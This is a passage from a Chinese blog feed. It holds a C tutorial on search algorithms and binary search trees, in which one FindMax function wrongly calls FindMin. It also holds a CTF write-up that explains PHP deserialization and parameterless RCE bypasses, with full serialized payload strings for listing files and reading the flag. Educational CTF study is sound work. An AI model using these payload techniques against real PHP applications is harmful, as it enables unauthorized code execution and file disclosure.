顺序查找</h3><p>为了结构还是给它点面子吧，最简单最无聊的查找算法，没有之一。手搓一个for或者while循环即可满足操作（如果你甚至不知道怎么搓循环，我很好奇你是怎么看到这的）</p><p>不过为了排版起见我还是简单地丢一段示例代码在这里。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>],b[<span class="number">10</span>],c;</span><br><span class="line">    <span class="type">_Bool</span> <span class="type">bool</span>;</span><br><span class="line">    srand((<span class="type">unsigned</span> ) time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;创建一个大小为10的无序数组……\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        a[i]=rand()%<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printf(&quot;%d&quot;,rand()%10)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;创建成功，数组为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    c=rand()%<span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n查找元素c：%d\n&quot;</span>,c);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d==%d？\n&quot;</span>,a[i],c);</span><br><span class="line">        <span class="type">bool</span>=a[i]==c;</span><br><span class="line">        <span class="comment">// printf(&quot;%d\n&quot;,bool);</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="type">bool</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;找到了\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;false\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;没找到\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与其他查找算法相比，顺序查找：</p><ul><li>优点：算法简单，适应面广。对表的结构无任何要求，无论记录是否按关键字有效都适用。</li><li>缺点：平均查找长度大，特别是当N很大时，查找效率低下。</li></ul><h3 id="拆分查找"><a class="markdownIt-Anchor" href="#拆分查找"></a> 拆分查找</h3><p>其实我更喜欢叫它“快速查找”，因为它的思想和快速排序很像。了解过快排的都知道什么意思，不过我在这里还是简要的提一嘴。</p><p>首先折半查找只适用于一个<strong>顺序储存结构</strong>的<strong>有序表</strong>。在这个基础上，我们才能够确定查找表（为了简单起见我假设他是一个有序数组a[N]）初始的最大项和最小项，将它们的下标记为max=N和min=0。由max和min我们可以计算出中间值的下标，我们记为mid=(min+max)/2。之后要做的就是将要查找的值与中间值a[mid]进行比较来逐步缩小查找范围，每次都只在大于或小于中间值的一半进行搜索。由于拆分查找这样做每次比较能丢弃掉一半的数据，所以是十分高效的。</p><p>这里我也简单的放出它的代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">QuickFind</span><span class="params">(<span class="type">int</span>* FindArray,<span class="type">int</span> Target,<span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> min,max,mid;</span><br><span class="line">    min=<span class="number">0</span>;</span><br><span class="line">    max=length<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n使用折半查找来查找元素%d\n&quot;</span>,Target);</span><br><span class="line">    <span class="keyword">while</span> (min&lt;=max)&#123;</span><br><span class="line">        mid=(<span class="type">int</span>)((min+max)/<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;min=%d max=%d mid=%d\n&quot;</span>,FindArray[min],FindArray[max],FindArray[mid]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d==%d?\n&quot;</span>, Target, FindArray[mid]);</span><br><span class="line">        <span class="keyword">if</span> (FindArray[mid] == Target)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;True\n找到了\n\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FindArray[mid] &lt; Target)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;False\n小了\n&quot;</span>);</span><br><span class="line">            min=mid+<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;False\n大了\n&quot;</span>);</span><br><span class="line">            max=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if (max==min) &#123;</span></span><br><span class="line">        <span class="comment">//     printf(&quot;没找到\n\n&quot;);</span></span><br><span class="line">        <span class="comment">//     return ;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;没找到\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>],c,d;</span><br><span class="line">    <span class="type">int</span> min,max,mid,length;</span><br><span class="line"></span><br><span class="line">    srand((<span class="type">unsigned</span> ) time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;生成一个有序数列\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        a[i]=rand()%<span class="number">50</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j) &#123;</span><br><span class="line">            <span class="type">int</span> temp;</span><br><span class="line">            <span class="keyword">if</span> (a[j]&lt;a[j<span class="number">-1</span>])&#123;</span><br><span class="line">                temp=a[j];</span><br><span class="line">                a[j]=a[j<span class="number">-1</span>];</span><br><span class="line">                a[j<span class="number">-1</span>]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;生成成功，数列为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c=rand()%<span class="number">50</span>;</span><br><span class="line">    d=a[rand()%<span class="number">10</span>];</span><br><span class="line">    length=<span class="keyword">sizeof</span> (a)/<span class="keyword">sizeof</span> (<span class="type">int</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;使用折半查找来查找元素c：%d\n&quot;,c);</span></span><br><span class="line">    QuickFind(a,c,length);</span><br><span class="line">    QuickFind(a,d,length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于拆分查找的特性，我们可以用一棵二叉树来表述，树中的每个节点代表一个记录，节点中的值为该记录在表中的位置，通常我们称这个描述查找过程的二叉树为<strong>判定树</strong>。</p><h3 id="分块查找"><a class="markdownIt-Anchor" href="#分块查找"></a> 分块查找</h3><p>分块查找其实更多的是一种改进算法的思想，而不是一种全新的查找算法。</p><p>首先对每个子表（或称块）建立一个索引项。索引项包括两项内容：关键字项（其值可以是表中的最大关键字）和指针项（记录该子表的第一个记录在表中的位置）。要求在分块后，数据整体按块有序，但是块的内部任仍然是无序的。</p><p>这样分块后，我们在查找元素时，可以首先按关键字查找分块的索引值快速定位查找元素的大致范围。至于如何查找索引表，可以顺序查找块，也可以二分/拆分查找块。但是在对应的数据块中仍然是无序的，我们就只能按照顺序查找块中的元素。</p><p>由于分块查找需要先查找索引表后再查找相应的数据块，所以至少要进行<strong>两次</strong>关键词比较。</p><p>由于查找表的数据类型不定，这里就暂且不给出建立索引表的代码了。</p><h2 id="动态查找"><a class="markdownIt-Anchor" href="#动态查找"></a> 动态查找</h2><p>终于进入到本篇文章的重头戏了，重点是二叉搜索树和二叉平衡树。其中二叉搜索树是二叉平衡树的基础。这里又涉及到树的知识了，理论上说这节内容也可以归档于树的问题集。</p><h3 id="二叉搜索树"><a class="markdownIt-Anchor" href="#二叉搜索树"></a> 二叉搜索树</h3><p>二叉搜索树的主要用途是为了做<em>搜索</em>。一般的二叉树进行搜索的最坏情况时间复杂度为O(n)，而二叉搜索树则能在最坏情况下将时间复杂度降至O(logn)。</p><h4 id="性质"><a class="markdownIt-Anchor" href="#性质"></a> 性质</h4><p>在二叉搜索树中，左子树中所有节点的值应该小于根节点的值，右子树种所有节点的值应该大于根节点的值，这就意味着：</p><ul><li>一个节点的左子树只能包含比该节点小的节点。</li><li>一个节点的右子树只能包含比该节点大的节点。</li><li>其左右子树也必须是二叉搜索树。</li></ul><p>举个例子，下图就是一棵二叉搜索树。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph TB;</span><br><span class="line">1((7))--&gt;2((4))</span><br><span class="line">1((7))--&gt;3((9))</span><br><span class="line">2((4))--&gt;4((2))</span><br><span class="line">2((4))--&gt;5((5))</span><br></pre></td></tr></table></figure><p>二叉搜索树的声明与常规二叉树的声明之间没有不同，他们之间的差别仅仅体现在节点的值上而不是结构上。但是为了方便我们重新修改了节点的名字。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTreeNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h4><ul><li>因为二叉树特殊的性质以及根节点总是位于左子树和右子树之间，所以对二叉搜索树做中序遍历，能够得到一个有序序列。</li><li>在二叉搜索树中，我们要么只考虑左子树要么只考虑右子树，而不用同时考虑左右两个子树，因此相较于常规二叉树效率大大提高了。</li></ul><h4 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h4><p>二叉搜索树的主要操作如下：</p><ul><li>在二叉搜索树中查找元素/查找最大元素/查找最小元素</li><li>插入元素到搜索二叉树中</li><li>从二叉树搜索树中删除元素</li></ul><p>辅助操作如下：</p><ul><li>在二叉搜索树中查找第k小的元素</li><li>对二叉搜索树的节点进行排序</li></ul><h5 id="查找元素"><a class="markdownIt-Anchor" href="#查找元素"></a> 查找元素</h5><p>在BST中查找元素是很简单的，我们从根节点开始，依次将查找值与根节点进行比较。如果查找值大于根节点，那么就进入根节点的右子树；如果查找值小于根节点，那么就进入根节点的左子树；如果查找值等于根节点，那么查找结束；如果直到根节点的左子树或者右子树为NULL都未找到查找元素，说明代查元素不存在，我们返回NULL指针即可。</p><p>下面是具体的代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode*<span class="title function_">Find</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root,<span class="type">int</span> data)</span>&#123;<span class="comment">//递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(data&lt;root-&gt;data)</span><br><span class="line">        <span class="keyword">return</span> Find(root-&gt;left,data);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(data&gt;root-&gt;data)</span><br><span class="line">        <span class="keyword">return</span> Find(root-&gt;right,data);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode* <span class="title function_">Find</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root,<span class="type">int</span> data)</span>&#123;<span class="comment">//非递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (root)&#123;</span><br><span class="line">    <span class="keyword">if</span>(data==root-&gt;data)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(data&gt;root-&gt;data)</span><br><span class="line">        root=root-&gt;right;</span><br><span class="line">    <span class="keyword">else</span> root=root-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最坏情况下的时间复杂度为O(n)（当BST为一棵偏斜树时），这为我们之后介绍平衡二叉搜索树埋下了伏笔。</p><h5 id="查找最小元素"><a class="markdownIt-Anchor" href="#查找最小元素"></a> 查找最小元素</h5><p>在BST中，最小元素是最左下节点，该节点没有左孩子。</p><p>代码实现如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode*<span class="title function_">FindMin</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root)</span>&#123;<span class="comment">//递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;left==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> FindMin(root-&gt;left);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode*<span class="title function_">FindMin</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root)</span>&#123;<span class="comment">//非递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (root-&gt;left!=<span class="literal">NULL</span>)</span><br><span class="line">        root=root-&gt;left;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="查找最大元素"><a class="markdownIt-Anchor" href="#查找最大元素"></a> 查找最大元素</h5><p>和查找最小元素的思路相同，原理不再赘述。</p><p>下面是具体的代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode* <span class="title function_">FindMax</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root)</span>&#123;<span class="comment">//递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;right==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> FindMin(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BinarySearchTreeNode*<span class="title function_">FindMax</span><span class="params">(<span class="keyword">struct</span> BinarySearchTreeNode*root)</span>&#123;<span class="comment">//非递归写法</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (root-&gt;right!=<span class="literal">NULL</span>)</span><br><span class="line">        root=root-&gt;right;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr /><p>（待更新……）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/21%20-%2022.png" alt="21 - 22" /></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BTS </tag>
            
            <tag> AVL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的RCE问题集锦</title>
      <link href="/posts/5dc661771ecb/"/>
      <url>/posts/5dc661771ecb/</url>
      
        <content type="html"><![CDATA[<p><code>RCE</code>是Remote Command Exec(远程命令执行)和Remote Code Exec(远程代码执行)的缩写;Command指的是操作系统的命令，code指的是脚本语言(php)的代码。CTF中有许多涉及到RCE的题目，我会将我遇到的题放在这里汇总并且穿插知识点讲解。</p><h2 id="湖南省网络攻防邀请大赛ezrce"><a class="markdownIt-Anchor" href="#湖南省网络攻防邀请大赛ezrce"></a> 湖南省网络攻防邀请大赛ezrce</h2><p>原题代码如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shell</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$this</span>-&gt;exp);</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span> , <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[<span class="subst">$code</span>]+$/&quot;</span>,<span class="variable">$str</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;exp.<span class="string">&quot; hello world!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]|get/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>简单的审一下题，发现有四个关键点。</p><ol><li>开头的shell类中定义了一个析构函数<code> __destruct()</code>，意思是当对象在被销毁时调用此方法。一般出现魔术常量，十有八九就要用到反序列化了。</li><li>析构函数内部有<code>preg_replace('/[^\W]+\((?R)?\)/', '', $this-&gt;exp)</code>这一串代码。<code>(?R)</code>引用当前表达式，后面加了<code>?</code>递归调用。</li><li><code>eval($this-&gt;exp.&quot; hello world!&quot;);</code>中，这串代码在传入的exp后面拼接上了一个<code>hello world！</code>，这会导致eval语句产生语法错误而任意执行失败，需要想办法绕过。</li><li><code>if(!preg_match('/^[Oa]|get/i',$_GET['exp']))</code>这个正则匹配我们使用get方式上传的exp中以‘O’或‘a’开头以及匹配所有‘get’开头的单词，如果没有匹配到才能执行反序列化。</li></ol><p>也就是说这一道题就相当于四道题的知识点，而且还把这四个点组合在一起，实在是用心险恶。</p><p>那么我们就将其逐个击破依次来分析到底应该如何绕过达到RCE。</p><h3 id="绕过传参正则匹配"><a class="markdownIt-Anchor" href="#绕过传参正则匹配"></a> 绕过传参正则匹配</h3><p>由于题目中用到了析构函数<code> __destruct()</code>和反序列化函数<code>unserialize()</code>，所以我们需要构造一个exp将其实例化后的序列化字符串作为参数传入。但是这里有一个问题，当我们对exp实例化后，它的类型就变成了”对象“<code>Object</code>，实例化后的字符串开头必为<code>O</code>，这就导致我们被waf拦截无法成功传入exp。同样的，利用数组绕过，将数组元素实例化也无法绕过waf，因为数组序列化字符串开头为<code>a</code>。</p><p>咋一看好像我们所有的路都被堵死了，我过我在查阅大量资料后发现了几篇大佬的博客，有一段是这么说的：</p><blockquote><p>说说实现了serializable接口的类</p><p>实现了serializable接口的类在序列化的时候返回的字符串是C开头的</p><p>这一点可以绕过例如 O:\d+的这种正则</p></blockquote><p>而且还可以通过跑一个脚本来查看当前哪些类继承了serializable。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$clazz</span>)&#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$clazz</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>,<span class="keyword">array</span>(<span class="string">&quot;serialize&quot;</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$clazz</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204161325432.png" alt="image-20231204161325432" /></p><p>也就是说，用这几个类来实例化对象，返回的序列化字符串开头将为<code>C</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204161421082.png" alt="image-20231204161421082" /></p><p>但是这么做仍然有问题。由于PHP版本的原因，高版本跑出来的序列化字符串仍然为<code>O</code>。但是自己写的类去实现serializeble接口再去序列化是没有问题的。建议用phpstorm，ide有在线低版本平台，是可以跑出来结果的。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204162158897.png" alt="image-20231204162158897" /></p><p>这里插句题外话，当时我没有找到合适的低版本平台，所以是照着老版本的序列化格式手搓exp的，还开了个字数统计器去数字数……</p><p>总之，通过调用实现了serializable接口的类，是可以实现绕过正则传参的。</p><p>至于为什么可以得到<code>C格式</code>，这个C的意思有可能是 <strong>Customized serializing</strong> 的意思。具体的原理可见后续的参考文章。</p><h3 id="攻破无参rce"><a class="markdownIt-Anchor" href="#攻破无参rce"></a> 攻破无参RCE</h3><p>在传入序列化exp后，下一只拦路虎就是<code>preg_replace('/[^\W]+\((?R)?\)/', '', $this-&gt;exp)</code>了。以上正则表达式只匹配<code>a(b(c()))</code>或<code>a()</code>这种格式，不匹配<code>a(&quot;123&quot;)</code>，也就是说我们传入的值函数不能带有参数，我们称呼它为<code>无参RCE</code>。</p><p>无参RCE主要考查的是你对与PHP函数的基类，无需输入参数来实现任意文件读取。</p><p>这里我们构造exp为<code>print_r(scandir(current(localeconv())));</code>。</p><ul><li><code>localeconv()</code>:返回一包含本地数字及货币格式信息的数组，数组的第一项是<code>.</code>，<code>.</code>的意思是当前目录。同理<code>getcwd()</code>函数也具有同样的效果，但是由于本题waf禁止了序列化中<code>get</code>开头的单词，所以不用这个。</li><li><code>current()</code>:返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回当前文件的工作目录。</li><li><code>scandir()</code>:列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 <strong><code>FALSE</code></strong>。如果 <code>directory</code> 不是个目录，则返回布尔值 <strong><code>FALSE</code></strong> 并生成一条 <strong><code>E_WARNING</code></strong> 级的错误。</li><li><code>print_r()</code>:以规定的格式打印对象，数组等结构。</li></ul><p>也就是说，这四个函数组合在一起就是返回并打印当前目录中的文件情况。</p><p>但是此时仍然无法顺利进行传参，因为还有最后一道墙等着我们。</p><h3 id="绕过拼接符"><a class="markdownIt-Anchor" href="#绕过拼接符"></a> 绕过拼接符</h3><p>因为末尾拼接了换行和非法的php语法字符串，导致语法错误。如果没有换行的话，可以采用注释来绕过，但是这里不行，无参RCE的筛选会导致单行注释失败。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$this</span>-&gt;exp);</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span> , <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[<span class="subst">$code</span>]+$/&quot;</span>,<span class="variable">$str</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;exp.<span class="string">&quot; hello world!&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>经过一系列复杂的正则，<code>$str</code>变量被筛去形如<code>abc((()))</code>的格式，最终只会得到一条完整语句的最后那部分<code>;</code>。而<code>$code</code>截取并赋值为<code>$str</code>的第一个字符，也为<code>;</code>。最后进入eval语句的正则匹配含义是要求<code>$str</code>变量完全由<code>$code</code>的字符构成，也就是说<code>$str</code>必须全为<code>;</code>。</p><p>然而针对这种情况，可以使用CTF以前常见的一种思路，来进行闭合PHP语句向下执行。构造exp为<code>print_r(scandir(current(localeconv())));__halt_compiler();</code>。</p><p>关于<code>__halt_compiler()</code>:<a href="https://www.php.net/manual/zh/function.halt-compiler.php">php文档介绍</a>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204165547944.png" alt="image-20231204165547944" /></p><p>这里我们用<code>;</code>隔离了两条语句上传，最后<code>$str</code>值为<code>;;</code>，不影响最后的正则匹配，因此可以进入eval语句并且成功绕过拼接符后的非法字符串。</p><p>至此，万事俱备只欠东风。</p><h3 id="得到flag"><a class="markdownIt-Anchor" href="#得到flag"></a> 得到flag</h3><p>构造exp并序列化后，传参<code>?exp=C:11:&quot;ArrayObject&quot;:103:&#123;x:i:0;a:0:&#123;&#125;;m:a:1:&#123;s:1:&quot;a&quot;;O:5:&quot;shell&quot;:1:&#123;s:3:&quot;exp&quot;;s:40:&quot;print_r(scandir(current(localeconv())));&quot;;&#125;&#125;&#125;</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204170110308.png" alt="image-20231204170110308" /></p><p>得到敏感文件。</p><p>继续构造exp为<code>highlight_file(next(array_reverse(scandir(current(localeconv())))));__halt_compiler();</code>。</p><ul><li><code>array_reverse()</code>:数组反转，将索引和值对换，在这里就是将文件名和对应的文件内容关系对换，将文件内容作为索引值。</li><li><code>next()</code>:将内部指针指向数组中的下一个元素，并输出。</li><li><code>highlight_file()</code>:高亮显示文件内容。</li></ul><p>组合在一起就是高亮回显flag的文件代码。</p><p>传入exp的序列化字符串<code>?exp=C:11:&quot;ArrayObject&quot;:149:&#123;x:i:0;a:0:&#123;&#125;;m:a:1:&#123;s:1:&quot;a&quot;;O:5:&quot;shell&quot;:1:&#123;s:3:&quot;exp&quot;;s:86:&quot;highlight_file(next(array_reverse(scandir(current(localeconv())))));__halt_compiler();&quot;;&#125;&#125;&#125;</code>。</p><p>得到flag。</p><p><img 